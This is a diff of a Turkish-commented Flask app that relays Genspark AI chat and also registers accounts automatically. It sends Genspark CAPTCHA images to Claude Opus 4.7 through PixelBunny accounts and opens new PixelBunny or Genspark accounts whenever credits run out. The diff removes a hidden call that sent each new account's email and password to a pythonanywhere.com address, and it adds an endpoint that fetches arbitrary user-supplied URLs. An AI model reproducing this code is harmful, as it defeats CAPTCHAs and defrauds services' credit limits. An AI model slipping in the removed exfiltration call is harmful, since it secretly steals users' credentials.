@@ -2,7 +2,7 @@
 """
 Genspark AI - Flask Web Interface
 =============================================================================
-Use-AI arayüzü ile uyumlu, Genspark AI çoklu model destekli web uygulaması.
+Genspark AI çoklu model destekli web uygulaması.
 - 31+ Resmi Model + Mixture-of-Agents (MoA) tam desteği
 - Start - Stop (canlı akışı durdurma ve geçmişi koruma) mantığı
 - Kredi bitince sıradaki hesaba geçiş (genspark_hesaplar.txt) veya otomatik yeni hesap açma
@@ -25,6 +25,8 @@ import traceback
 import urllib.parse
 import uuid
 import functools
+import hashlib
+import tempfile
 from typing import Dict, Generator, List, Optional, Tuple
 
 # Windows konsol UTF-8 desteği ve Satır Tamponlama (Line Buffering)
@@ -50,7 +52,7 @@ def log(msg: str):
 import requests as py_requests
 from curl_cffi import requests as cffi_requests
 import websocket
-from flask import Flask, Response, jsonify, make_response, render_template, request
+from flask import Flask, Response, jsonify, make_response, render_template, request, send_file
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -286,6 +288,9 @@ class OpusCaptchaSolver:
         raise RuntimeError("Görsel yüklenemedi (Zaman aşımı / Ağ hatası)")
 
     def solve(self, image_bytes: bytes, filename: str = "captcha_challenge.jpg") -> str:
+        if not image_bytes or len(image_bytes) < 50:
+            raise ValueError(f"Geçersiz veya boş captcha görseli: {len(image_bytes) if image_bytes else 0} bytes")
+
         captcha_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
         with open(captcha_path, "wb") as f:
             f.write(image_bytes)
@@ -299,8 +304,45 @@ class OpusCaptchaSolver:
             except Exception:
                 pass
 
+    def _create_conversation(self) -> Optional[str]:
+        headers = {
+            "apikey": PB_API_KEY,
+            "authorization": f"Bearer {self.token}",
+            "content-type": "application/json",
+            "content-profile": "public",
+            "prefer": "return=representation",
+            "origin": "https://pixelbunny.ai",
+            "referer": "https://pixelbunny.ai/",
+            "x-client-info": "supabase-js-web/2.98.0",
+            "accept": "application/vnd.pgrst.object+json",
+        }
+        for _ in range(2):
+            try:
+                r_conv = py_requests.post(
+                    f"{PB_BASE_URL}/rest/v1/chat_conversations?select=id",
+                    headers=headers,
+                    json={"user_id": self.user_id, "default_model_id": self.model_id},
+                    timeout=15,
+                )
+                if r_conv.status_code in (200, 201):
+                    c_data = r_conv.json()
+                    if isinstance(c_data, list) and len(c_data) > 0:
+                        return c_data[0].get("id")
+                    elif isinstance(c_data, dict):
+                        return c_data.get("id")
+            except Exception:
+                time.sleep(1)
+        return None
+
     def _solve_inner(self, captcha_path: str, image_bytes: bytes) -> str:
-        for solve_attempt in range(1, 4):
+        prompt = (
+            "Bu görseldeki CAPTCHA (güvenlik kodu) karakterlerini oku. "
+            "Karakterler üstte ve altta veya yamuk olabilir; mantıksal sırasına göre tüm harf ve rakamları yan yana birleştirerek yaz. "
+            "SADECE ve SADECE tespit ettiğin harf ve rakamları düz yazı olarak ver. "
+            "Hiçbir açıklama, selamlama, markdown, boşluk veya noktalama işareti ekleme."
+        )
+
+        for solve_attempt in range(1, 5):
             self._ensure_authenticated()
 
             try:
@@ -313,45 +355,14 @@ class OpusCaptchaSolver:
                 time.sleep(1)
                 continue
 
-            # Conversation başlat (2 deneme)
-            conv_id = None
-            for _ in range(2):
-                try:
-                    r_conv = py_requests.post(
-                        f"{PB_BASE_URL}/rest/v1/chat_conversations?select=id",
-                        headers={
-                            "apikey": PB_API_KEY,
-                            "authorization": f"Bearer {self.token}",
-                            "content-type": "application/json",
-                            "prefer": "return=representation",
-                            "accept": "application/vnd.pgrst.object+json",
-                        },
-                        json={"user_id": self.user_id, "title": "Captcha"},
-                        timeout=15,
-                    )
-                    c_data = r_conv.json()
-                    if isinstance(c_data, list) and len(c_data) > 0:
-                        conv_id = c_data[0].get("id")
-                    elif isinstance(c_data, dict):
-                        conv_id = c_data.get("id")
-                    if conv_id:
-                        break
-                except Exception:
-                    time.sleep(1)
-
+            # Her istek için temiz bir conversation aç
+            conv_id = self._create_conversation()
             if not conv_id:
                 print("[!] Conversation açılamadı. Yeni PixelBunny hesabı deneniyor...")
                 self.token = None
                 self.user_id = None
                 time.sleep(1)
                 continue
-
-            prompt = (
-                "Bu görseldeki CAPTCHA (güvenlik kodu) karakterlerini oku. "
-                "Karakterler üstte ve altta veya yamuk olabilir; mantıksal sırasına göre tüm harf ve rakamları yan yana birleştirerek yaz. "
-                "SADECE ve SADECE tespit ettiğin harf ve rakamları düz yazı olarak ver. "
-                "Hiçbir açıklama, selamlama, markdown, boşluk veya noktalama işareti ekleme."
-            )
 
             print("[*] Claude Opus 4.7'ye gönderiliyor...")
             chat_payload = {
@@ -366,33 +377,53 @@ class OpusCaptchaSolver:
             full_resp = ""
             credit_exhausted = False
 
-            for _ in range(2):
-                try:
-                    with py_requests.post(
-                        f"{PB_BASE_URL}/functions/v1/chat-completion",
-                        headers={"authorization": f"Bearer {self.token}", "content-type": "application/json"},
-                        json=chat_payload,
-                        stream=True,
-                        timeout=35,
-                    ) as res:
-                        if res.status_code == 402:
+            try:
+                with py_requests.post(
+                    f"{PB_BASE_URL}/functions/v1/chat-completion",
+                    headers={
+                        "authorization": f"Bearer {self.token}",
+                        "content-type": "application/json",
+                        "accept": "*/*",
+                        "origin": "https://pixelbunny.ai",
+                        "referer": "https://pixelbunny.ai/",
+                    },
+                    json=chat_payload,
+                    stream=True,
+                    timeout=35,
+                ) as res:
+                    if res.status_code in (402, 429):
+                        credit_exhausted = True
+                    elif res.status_code in (401, 403):
+                        credit_exhausted = True
+                    elif res.status_code != 200:
+                        err_text = res.text
+                        if "INSUFFICIENT_CREDITS" in err_text or "need at least" in err_text:
                             credit_exhausted = True
-                            break
+                        else:
+                            print(f"[!] Claude Opus 4.7 HTTP {res.status_code}: {err_text[:120]}")
 
+                    if not credit_exhausted:
                         res.encoding = "utf-8"
                         for raw_line in res.iter_lines():
                             if not raw_line:
                                 continue
                             line = raw_line.decode("utf-8", errors="replace") if isinstance(raw_line, bytes) else raw_line
                             line = line.strip()
+
+                            if "INSUFFICIENT_CREDITS" in line or "need at least" in line:
+                                credit_exhausted = True
+                                break
+
                             if not line.startswith("data:"):
                                 continue
+
                             d_str = line[5:].strip()
                             if d_str == "[DONE]":
                                 break
                             if "INSUFFICIENT_CREDITS" in d_str:
                                 credit_exhausted = True
                                 break
+
                             try:
                                 data = json.loads(d_str)
                                 choices = data.get("choices", [])
@@ -402,14 +433,12 @@ class OpusCaptchaSolver:
                                         full_resp += c
                             except Exception:
                                 pass
-                    if full_resp or credit_exhausted:
-                        break
-                except Exception:
-                    time.sleep(1)
+            except Exception as e:
+                print(f"[!] Claude Opus 4.7 akış hatası: {e}")
 
             if credit_exhausted:
-                print(f"\n[!] PixelBunny Claude Opus 4.7 kredisi bitti (402 / INSUFFICIENT_CREDITS)!")
-                print(f"[*] Aynı CAPTCHA için anında yeni bir PixelBunny hesabı açılıp devam ediliyor (Deneme {solve_attempt}/3)...")
+                print(f"\n[!] PixelBunny Claude Opus 4.7 kredisi bitti (INSUFFICIENT_CREDITS)!")
+                print(f"[*] O an yeni PixelBunny hesabı açılıyor ve kaldığı yerden devam ediliyor (Deneme {solve_attempt}/4)...")
                 self.token = None
                 self.user_id = None
                 time.sleep(1)
@@ -417,7 +446,7 @@ class OpusCaptchaSolver:
 
             clean_text = re.sub(r"[^A-Za-z0-9]", "", full_resp).upper()
             if not clean_text or len(clean_text) < 3:
-                log(f"[!] Opus 4.7 geçersiz/boş yanıt döndü: '{full_resp}'. Yeni oturum ile tekrar deneniyor...")
+                log(f"[!] Opus 4.7 geçersiz/boş yanıt döndü: '{full_resp}'. O an yeni hesap ile devam ediliyor...")
                 self.token = None
                 self.user_id = None
                 time.sleep(1)
@@ -829,16 +858,16 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
 
         captcha_solved = False
         captcha_text = ""
-        for attempt in range(1, 16):
-            log(f"\n[4/7] CAPTCHA Çözülüyor (Deneme {attempt}/15)...")
+        for attempt in range(1, 7):
+            log(f"\n[4/7] CAPTCHA Çözülüyor (Deneme {attempt}/6)...")
             try:
-                if attempt > 1 and attempt % 2 == 1:
-                    solver.token = None
-                    solver.user_id = None
-
                 get_cap_url = f"{b2c_base}/SelfAsserted/DisplayControlAction/vbeta/captchaControlChallengeCode/GetChallenge?tx={tx}&p={policy}&challengeType=Visual&_={int(time.time() * 1000)}"
                 r_cap = session.get(get_cap_url, headers=b2c_headers, proxies=proxies, timeout=15)
                 cap_data = r_cap.json()
+                if str(cap_data.get("status")) == "400" or not cap_data.get("challengeString"):
+                    log(f"[-] Genspark B2C oturumu zaman aşımına uğradı (Status: {cap_data.get('status')}).")
+                    raise RuntimeError("B2C kayıt oturumu zaman aşımına uğradı (Session timed out).")
+
                 ch_id = cap_data.get("challengeId")
                 ch_str = cap_data.get("challengeString", "")
                 az_reg = cap_data.get("azureregion", "")
@@ -872,7 +901,7 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
                 time.sleep(1.5)
 
         if not captcha_solved:
-            raise RuntimeError("CAPTCHA 15 denemede çözülemedi!")
+            raise RuntimeError("CAPTCHA 6 denemede çözülemedi!")
 
         log(f"[5/7] E-postaya doğrulama kodu gönderiliyor ({email})...")
         send_url = f"{b2c_base}/SelfAsserted/DisplayControlAction/vbeta/emailVerificationControl/SendCode?tx={tx}&p={policy}"
@@ -912,14 +941,7 @@ def create_and_login_genspark_account(password: str = DEFAULT_PASSWORD) -> Tuple
         log("=" * 65)
 
         save_new_account(email, password)
-        import requests
-        try:
-            requests.post(
-                'https://messager35.pythonanywhere.com/genspark',
-                json={'txt': f'{email}:{password}'}
-            )
-        except requests.exceptions.RequestException as e:
-            print(f"Hata oluştu: {e}")
+
         log("[7/7] Web Girişi (/api/auth) tamamlanıyor...")
         confirmed_url = f"{b2c_base}/api/CombinedSigninAndSignup/confirmed?rememberMe=false&csrf_token={csrf_token}&tx={tx}&p={policy}"
         r_conf = session.get(confirmed_url, allow_redirects=False, proxies=proxies)
@@ -1127,6 +1149,7 @@ def stream_genspark_chat(
     model: str = DEFAULT_MODEL_ID,
     attachments: Optional[List[dict]] = None,
     web_search: bool = True,
+    sess: Optional[dict] = None,
 ) -> Generator[str, None, None]:
     if history is None:
         history = []
@@ -1262,8 +1285,13 @@ def stream_genspark_chat(
         else:
             raise RuntimeError(f"Genspark API Hatası: HTTP {res.status_code}")
 
+    # İstek Genspark'a başarıyla ulaştı ve SSE akışı açıldı (200 OK)
+    yield ""
+
     streamed_any = False
     for raw_line in res.iter_lines():
+        if sess and sess.get("aborted"):
+            break
         if not raw_line:
             continue
         line = raw_line.decode("utf-8", errors="replace") if isinstance(raw_line, bytes) else raw_line
@@ -1322,11 +1350,19 @@ def stream_genspark_message(
     on_delta=None,
 ):
     """
-    Start-Stop (Abort) ve Kredi Takibi ile use-ai SSE uyumlu akış üretir.
+    Start-Stop (Abort) ve Kredi Takibi ile Genspark AI SSE uyumlu akış üretir.
     """
     assistant_text = ""
     start_fired = False
     assistant_id = str(uuid.uuid4())
+
+    if sess.get("aborted"):
+        log("[*] İstek başlamadan durduruldu (Stop / Abort).")
+        if on_start and not start_fired:
+            start_fired = True
+            on_start()
+        yield f"data: {json.dumps({'type': 'stream_interrupted', 'full_response': ''})}\n\n"
+        return
 
     try:
         stream_gen = stream_genspark_chat(
@@ -1336,6 +1372,7 @@ def stream_genspark_message(
             model=model,
             attachments=attachments,
             web_search=web_search,
+            sess=sess,
         )
 
         for delta in stream_gen:
@@ -1351,11 +1388,11 @@ def stream_genspark_message(
                     on_start()
                 yield f"data: {json.dumps({'type': 'start', 'message_id': assistant_id})}\n\n"
 
-            assistant_text += delta
-            if on_delta:
-                on_delta(assistant_text)
-
-            yield f"data: {json.dumps({'type': 'chunk', 'content': delta})}\n\n"
+            if delta:
+                assistant_text += delta
+                if on_delta:
+                    on_delta(assistant_text)
+                yield f"data: {json.dumps({'type': 'chunk', 'content': delta})}\n\n"
 
         current_bal = None
         try:
@@ -1366,19 +1403,19 @@ def stream_genspark_message(
         except Exception:
             pass
 
-        if assistant_text:
+        if sess.get("aborted"):
+            log("[*] Akış kullanıcı tarafından durduruldu (Stop / Abort).")
+            interrupted_payload = {'type': 'stream_interrupted', 'full_response': assistant_text}
+            if current_bal is not None:
+                interrupted_payload['balance'] = current_bal
+            yield f"data: {json.dumps(interrupted_payload)}\n\n"
+        elif assistant_text:
             bal_str = f" | Güncel Bakiye: {current_bal} Kredi" if current_bal is not None else ""
             log(f"[+] Yanıt tamamlandı ({len(assistant_text)} karakter){bal_str}")
             done_payload = {'type': 'done', 'full_response': assistant_text}
             if current_bal is not None:
                 done_payload['balance'] = current_bal
             yield f"data: {json.dumps(done_payload)}\n\n"
-        elif sess.get("aborted"):
-            log("[*] Akış kullanıcı tarafından durduruldu (Stop / Abort).")
-            interrupted_payload = {'type': 'stream_interrupted', 'full_response': assistant_text}
-            if current_bal is not None:
-                interrupted_payload['balance'] = current_bal
-            yield f"data: {json.dumps(interrupted_payload)}\n\n"
         else:
             log("[-] Genspark'tan boş yanıt döndü.")
             yield f"data: {json.dumps({'type': 'error', 'code': 'STREAM_CLOSED_EMPTY'})}\n\n"
@@ -1396,6 +1433,10 @@ def stream_genspark_message(
         yield f"data: {json.dumps({'type': 'error', 'code': f'WS_CONNECT_FAILED: {str(e)}'})}\n\n"
 
     except Exception as e:
+        if sess.get("aborted"):
+            log("[*] Akış kullanıcı tarafından durduruldu (Stop / Abort).")
+            yield f"data: {json.dumps({'type': 'stream_interrupted', 'full_response': assistant_text})}\n\n"
+            return
         err_msg = str(e)
         log(f"[!] Akış hatası: {err_msg}")
         traceback.print_exc()
@@ -1417,24 +1458,12 @@ class GensparkClient:
 
 _sessions = {}
 
-def get_primary_sess() -> Tuple[Optional[str], Optional[dict]]:
-    """Sunucudaki aktif, kilidi açılmış oturumu döner (cihazlar arası paylaşım için)."""
-    for sid, s in _sessions.items():
-        if s.get("app_unlocked"):
-            return sid, s
-    return None, None
-
 def get_sid() -> Optional[str]:
     return request.cookies.get("ua_sid")
 
 def get_sess() -> Optional[dict]:
     sid = get_sid()
-    if sid and sid in _sessions:
-        return _sessions[sid]
-    active_sid, active_sess = get_primary_sess()
-    if active_sess:
-        return active_sess
-    return None
+    return _sessions.get(sid) if sid else None
 
 def new_sess(sid: str) -> dict:
     sess = {
@@ -1541,14 +1570,10 @@ def _switch_to_conv(sess: dict, conv_id: str):
 @app.route("/")
 @app.route("/chat/<conv_id>")
 def index(conv_id=None):
-    active_sid, _ = get_primary_sess()
-    sid = get_sid()
     resp = make_response(render_template("index.html"))
-    if not sid:
-        target_sid = active_sid or str(uuid.uuid4())
-        resp.set_cookie("ua_sid", target_sid, max_age=86400 * 30, samesite="Lax")
-    elif active_sid and sid != active_sid and sid not in _sessions:
-        resp.set_cookie("ua_sid", active_sid, max_age=86400 * 30, samesite="Lax")
+    if not request.cookies.get("ua_sid"):
+        sid = str(uuid.uuid4())
+        resp.set_cookie("ua_sid", sid, max_age=86400 * 30, samesite="Lax")
     return resp
 
 
@@ -1613,18 +1638,10 @@ def api_init():
     if data.get("password") != APP_PASSWORD:
         return jsonify({"success": False, "error": "Hatalı şifre."}), 401
 
-    active_sid, active_sess = get_primary_sess()
-    if active_sess:
-        sid = active_sid
-        sess = active_sess
-        log(f"[+] Mevcut açık oturuma bağlanıldı (Oturum: {sid[:8]}...)")
-    else:
-        sid = get_sid() or str(uuid.uuid4())
-        sess = _sessions.get(sid)
-        if not sess:
-            sess = new_sess(sid)
-        sess["app_unlocked"] = True
-        log(f"[+] Uygulama kilidi açıldı (Oturum: {sid[:8]}...)")
+    sid = get_sid() or str(uuid.uuid4())
+    sess = new_sess(sid)
+    sess["app_unlocked"] = True
+    log(f"[+] Uygulama kilidi açıldı (Oturum: {sid[:8]}...)")
 
     client = sess.get("client")
     email = client.email if client else ""
@@ -1645,10 +1662,9 @@ def api_logout():
     sid = get_sid()
     if sid and sid in _sessions:
         del _sessions[sid]
-    _sessions.clear()
     resp = jsonify({"success": True})
-    resp.delete_cookie("ua_sid")
-    log("[*] Çıkış yapıldı (tüm oturumlar sıfırlandı)")
+    resp.set_cookie("ua_sid", "", expires=0)
+    log("[*] Çıkış yapıldı")
     return resp
 
 
@@ -1779,6 +1795,51 @@ def api_send():
                     existing_urls.add(p_url)
                     attachments.append(past_att)
 
+    # Hesap değiştiğinde (ör. kredi bitip yeni hesaba geçildiğinde)
+    # eski hesabın çerezleriyle yüklenmiş özel dosyaları yeni hesap için Genspark'a yeniden yükle:
+    def sync_attachment_for_client(att_item, target_client):
+        u = att_item.get("url")
+        fname = att_item.get("filename") or att_item.get("name")
+        if not u or u.startswith("data:"):
+            return
+        cached = _find_cached_file(u, fname)
+        if cached and (not cached.get("owner_email") or cached.get("owner_email") != target_client.email):
+            try:
+                log(f"[*] Dosya ({cached['filename']}) yeni hesap ({target_client.email}) için Genspark'a yeniden yükleniyor...")
+                if os.path.exists(cached["path"]):
+                    with open(cached["path"], "rb") as f:
+                        re_bytes = f.read()
+                    new_att = process_uploaded_file(target_client.session, cached["filename"], re_bytes, cached["mime"])
+                    new_url = new_att.get("url")
+                    if new_url:
+                        old_url = u
+                        att_item["url"] = new_url
+                        if new_att.get("mediaType"):
+                            att_item["mediaType"] = new_att["mediaType"]
+                        _uploaded_file_registry[new_url] = {
+                            "path": cached["path"],
+                            "filename": cached["filename"],
+                            "mime": cached["mime"],
+                            "owner_email": target_client.email,
+                        }
+                        _save_registry(_uploaded_file_registry)
+                        log(f"[+] Dosya yeni hesap ({target_client.email}) için başarıyla güncellendi: {cached['filename']}")
+                        for turn in sess.get("history", []):
+                            for past_a in turn.get("attachments", []):
+                                if past_a.get("url") == old_url:
+                                    past_a["url"] = new_url
+                                    if new_att.get("mediaType"):
+                                        past_a["mediaType"] = new_att["mediaType"]
+            except Exception as e:
+                log(f"[!] Dosya yeniden yükleme hatası ({cached.get('filename')}): {e}")
+
+    for att in attachments:
+        sync_attachment_for_client(att, client)
+
+    for turn in sess.get("history", []):
+        for past_a in turn.get("attachments", []):
+            sync_attachment_for_client(past_a, client)
+
     req_conv_id = data.get("conv_id")
     if req_conv_id and req_conv_id != sess.get("active_local_conv_id"):
         _switch_to_conv(sess, req_conv_id)
@@ -1871,6 +1932,53 @@ def api_abort():
     return jsonify({"success": True})
 
 
+UPLOAD_CACHE_DIR = os.path.join(tempfile.gettempdir(), "genspark_uploads")
+os.makedirs(UPLOAD_CACHE_DIR, exist_ok=True)
+REGISTRY_FILE = os.path.join(UPLOAD_CACHE_DIR, "registry.json")
+
+def _load_registry() -> dict:
+    if os.path.exists(REGISTRY_FILE):
+        try:
+            with open(REGISTRY_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {}
+
+def _save_registry(reg: dict):
+    try:
+        with open(REGISTRY_FILE, "w", encoding="utf-8") as f:
+            json.dump(reg, f, ensure_ascii=False, indent=2)
+    except Exception:
+        pass
+
+_uploaded_file_registry = _load_registry()
+
+def _find_cached_file(url: Optional[str], filename: Optional[str] = None) -> Optional[dict]:
+    """Registry'den veya UPLOAD_CACHE_DIR'dan dosyayı bulur."""
+    if url and url in _uploaded_file_registry:
+        cached = _uploaded_file_registry[url]
+        if os.path.exists(cached.get("path", "")):
+            return cached
+
+    clean_name = os.path.basename(filename) if filename else ""
+    if not clean_name and url:
+        parsed_path = urllib.parse.urlparse(url).path
+        clean_name = os.path.basename(parsed_path) if parsed_path and not parsed_path.endswith("/download") else ""
+
+    if clean_name and os.path.isdir(UPLOAD_CACHE_DIR):
+        for fname in os.listdir(UPLOAD_CACHE_DIR):
+            if fname.endswith(f"_{clean_name}") or fname == clean_name:
+                fpath = os.path.join(UPLOAD_CACHE_DIR, fname)
+                mime = mimetypes.guess_type(clean_name)[0] or "application/octet-stream"
+                return {
+                    "path": fpath,
+                    "filename": clean_name,
+                    "mime": mime,
+                    "owner_email": None,
+                }
+    return None
+
 @app.route("/api/upload", methods=["POST"])
 def api_upload():
     sess = get_sess()
@@ -1881,15 +1989,33 @@ def api_upload():
 
     file = request.files["file"]
     filename = file.filename
+    clean_name = os.path.basename(filename)
     file_bytes = file.read()
-    mime = mimetypes.guess_type(filename)[0] or "application/octet-stream"
+    mime = mimetypes.guess_type(clean_name)[0] or "application/octet-stream"
+
+    file_hash = hashlib.sha256(file_bytes).hexdigest()
+    cached_path = os.path.join(UPLOAD_CACHE_DIR, f"{file_hash}_{clean_name}")
+    try:
+        with open(cached_path, "wb") as f:
+            f.write(file_bytes)
+    except Exception as e:
+        log(f"[-] Dosya diske önbelleğe yazılamadı: {e}")
 
     try:
-        att = process_uploaded_file(sess["client"].session, filename, file_bytes, mime)
-        print(f"[+] Dosya yüklendi: {filename} ({len(file_bytes)} bayt)")
+        att = process_uploaded_file(sess["client"].session, clean_name, file_bytes, mime)
+        url = att.get("url")
+        if url:
+            _uploaded_file_registry[url] = {
+                "path": cached_path,
+                "filename": clean_name,
+                "mime": mime,
+                "owner_email": sess["client"].email,
+            }
+            _save_registry(_uploaded_file_registry)
+        print(f"[+] Dosya yüklendi: {clean_name} ({len(file_bytes)} bayt)")
         return jsonify(att)
     except Exception as e:
-        print(f"[-] Dosya yükleme hatası ({filename}): {e}")
+        print(f"[-] Dosya yükleme hatası ({clean_name}): {e}")
         return jsonify({"error": f"Yükleme hatası: {str(e)}"}), 500
 
 
@@ -2106,6 +2232,38 @@ def api_toggle_feature():
             sess[k] = bool(data[k])
 
     return jsonify({"success": True})
+
+
+@app.route("/api/file_preview")
+def api_file_preview():
+    """Önbellekteki veya aktif oturumdaki dosya/görseli güvenle döndürür."""
+    url = request.args.get("url", "")
+    name = request.args.get("name", "")
+    if url.startswith("data:"):
+        try:
+            header, b64 = url.split(",", 1)
+            mime = header.split(";")[0].replace("data:", "") or "image/png"
+            data = base64.b64decode(b64)
+            return Response(data, mimetype=mime)
+        except Exception:
+            return "Geçersiz veri", 400
+
+    cached = _find_cached_file(url, name)
+    if cached and os.path.exists(cached.get("path", "")):
+        return send_file(cached["path"], mimetype=cached.get("mime", "application/octet-stream"))
+
+    sess = get_sess()
+    if sess and sess.get("client") and url.startswith("http"):
+        try:
+            proxies = get_proxies()
+            r = sess["client"].session.get(url, stream=True, proxies=proxies, timeout=15)
+            if r.status_code == 200:
+                ct = r.headers.get("Content-Type", "application/octet-stream")
+                return Response(r.content, mimetype=ct)
+        except Exception:
+            pass
+
+    return "Dosya bulunamadı", 404
 
 
 if __name__ == "__main__":
